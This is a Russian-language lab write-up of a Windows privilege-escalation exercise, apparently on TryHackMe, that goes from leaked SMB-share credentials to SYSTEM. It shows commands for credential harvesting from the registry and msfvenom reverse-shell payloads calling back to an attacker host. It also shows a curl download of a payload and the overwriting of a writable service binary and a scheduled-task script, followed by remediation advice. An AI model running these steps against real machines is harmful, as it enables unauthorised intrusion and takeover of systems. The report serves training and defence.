# Отчет по результатам тестирования на проникновение: Windows Jump

## Введение

В ходе выполнения задания была проведена эскалация привилегий на целевой Windows-машине (PRIVESC) в рамках сценария пентеста внутренней сети. Целью работы было продемонстрировать полную цепочку повышения прав от гостевого доступа до SYSTEM, используя стандартные техники эксплуатации уязвимостей ОС Windows и некорректных конфигураций.


## Этап 1: Разведка и сканирование

### Nmap-скан

На начальном этапе было выполнено сканирование целевой машины для выявления открытых портов и определения версий сервисов.

**Результаты сканирования:**
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Были обнаружены следующие критически важные для атаки сервисы:
- **SMB (порт 445)** — доступ к сетевым шарам
- **RDP (порт 3389)** — удаленный рабочий стол
- **WinRM (порт 5985)** — удаленное управление (не использовалось из-за отсутствия прав)


### Обнаружение SMB-шары и получение учетных данных

При подключении к SMB-серверу была обнаружена общедоступная шара `Public`:

```bash
smbclient -L //10.113.138.223 -N
```

**Найденные шары:**
```
Sharename       Type      Comment
--------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Public          Disk      Public file share
```

Внутри шары `Public` был обнаружен файл `welcome.txt`, содержащий учетные данные нового сотрудника:

```
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : Password1!
```

**Вывод:** Учетные данные `thmuser:Password1!` были подтверждены через инструмент NetExec 

```bash
netexec smb 10.113.138.223 -u thmuser -p "Password1!"
SMB         10.113.138.223  445    PRIVESC          [+] privesc\thmuser:Password1!
```


## Этап 2: Получение первоначального доступа и флага thmuser

С использованием полученных учетных данных был выполнен вход по RDP под пользователем `thmuser`:

```cmd
whoami
privesc\thmuser
```

Первый флаг был получен из файла `C:\Users\thmuser\Desktop\flag1.txt`.

**Результат:** Доступ к системе под пользователем `thmuser` получен.


## Этап 3: Исследование системы и эскалация до notadmin

### Проверка привилегий

На текущем этапе у пользователя `thmuser` отсутствовали значимые привилегии:

```
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

### Password Spraying

Попытка использования пароля `Password1!` для других пользователей не принесла результатов:

```bash
netexec smb 10.113.138.223 -u notadmin -p "Password1!"
[-] privesc\notadmin:Password1! STATUS_LOGON_FAILURE
```

### Поиск сохраненных учетных данных

При проверке реестра были обнаружены сохраненные учетные данные в параметре `DefaultPassword`:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    P@ssw0rd!
```

Учетные данные `notadmin:P@ssw0rd!` были подтверждены через NetExec:

```bash
netexec smb 10.113.138.223 -u notadmin -p "P@ssw0rd!"
[+] privesc\notadmin:P@ssw0rd!
```

### Использование службы Secondary Logon

Пользователь `notadmin` не входил в группы WinRM или RDP, однако была обнаружена запущенная служба **Secondary Logon**, которая позволяет использовать команду `runas` для запуска процессов от имени другого пользователя.

```cmd
runas /user:notadmin "cmd.exe"
```

**Результат:** Получен доступ к командной строке от имени `notadmin`. Второй флаг был получен из соответствующей директории.


## Этап 4: Эскалация до svcadmin через подмену службы

### Обнаружение уязвимой службы

В ходе анализа системы была найдена служба `THMSvc`, запускаемая от имени пользователя `svcadmin`:

```cmd
sc qc THMSvc

SERVICE_NAME: THMSvc
        BINARY_PATH_NAME   : C:\Windows\THMSVC\svc.exe
        SERVICE_START_NAME : .\svcadmin
```

### Проверка прав на бинарник службы

Был проведен анализ прав доступа к исполняемому файлу службы:

```cmd
icacls C:\Windows\THMSVC\svc.exe

C:\Windows\THMSVC\svc.exe Everyone:(F)
                          PRIVESC\notadmin:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
```

Группа `Everyone` имела полный доступ (`F`) к файлу, что позволило перезаписать его произвольным исполняемым файлом.

### Эксплуатация

Был сгенерирован reverse shell с использованием `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.144 LPORT=4444 -f exe -o svc.exe
```

Файл был загружен на целевую машину и перезаписал оригинальный бинарник службы:

```cmd
curl http://192.168.130.144:8888/svc.exe -o C:\Windows\THMSVC\svc.exe
```

После запуска службы:

```cmd
sc start THMSvc
```

Был получен reverse shell от пользователя `svcadmin` и третий флаг.


## Этап 5: Эскалация до SYSTEM через уязвимый планировщик задач

### Обнаружение уязвимого bat-файла

В директории `C:\Windows\tasks` был обнаружен файл `cleanup.bat`:

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/11/2026   6:41 AM             41 cleanup.bat
```

Права доступа к файлу:

```cmd
icacls cleanup.bat

cleanup.bat BUILTIN\Users:(I)(RX)
            PRIVESC\svcadmin:(I)(M)
            BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)
```

Пользователь `svcadmin` имел права на изменение (`M`) файла.

### Обнаружение задачи, запускающей `cleanup.bat`

При анализе планировщика задач была найдена задача `\THMCleanup`, которая выполняла `cleanup.bat` от имени SYSTEM с периодичностью в 1 минуту:

```
TaskName:                             \THMCleanup
Task To Run:                          cmd.exe /c C:\Windows\tasks\cleanup.bat
Run As User:                          SYSTEM
Repeat: Every:                        0 Hour(s), 1 Minute(s)
```

### Эксплуатация

Был создан новый reverse shell payload на порту 5555:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.130.144 LPORT=5555 -f exe -o shell.exe
```

Файл `cleanup.bat` был перезаписан так, чтобы он запускал `shell.exe`:

```cmd
echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat
```

После ожидания выполнения задачи (до 1 минуты) был получен reverse shell от **SYSTEM** и финальный флаг.


## Выводы и рекомендации

### Критические уязвимости, обнаруженные в ходе тестирования:

1. **Хранение паролей в открытом виде в реестре** (`DefaultPassword`) — позволяет получить доступ к учетным данным других пользователей без необходимости их взлома.

2. **Некорректные права доступа к бинарнику службы `THMSvc`** — группа `Everyone` имела полный доступ, что позволило подменить исполняемый файл и выполнить код от имени `svcadmin`.

3. **Отсутствие проверки целостности файлов планировщика задач** — файл `cleanup.bat` имел слабые права и запускался от SYSTEM, что позволило выполнить произвольный код с максимальными привилегиями.

4. **Наличие службы Secondary Logon** — позволило использовать `runas` для выполнения команд от имени другого пользователя.

### Рекомендации по устранению:

1. **Запретить хранение паролей в открытом виде в реестре** — использовать безопасные механизмы хранения учетных данных (LSA Secrets, Credential Manager).

2. **Ограничить права доступа к системным службам и бинарникам** — запретить модификацию исполняемых файлов служб для групп `Everyone` и `Users`.

3. **Настроить корректные права на файлы планировщика задач** — разрешить запись только доверенным администраторам.

4. **Отключить службу Secondary Logon, если она не требуется** — либо ограничить её использование через групповые политики.

5. **Внедрить систему обнаружения изменений файлов (File Integrity Monitoring)** для критических системных файлов и конфигураций.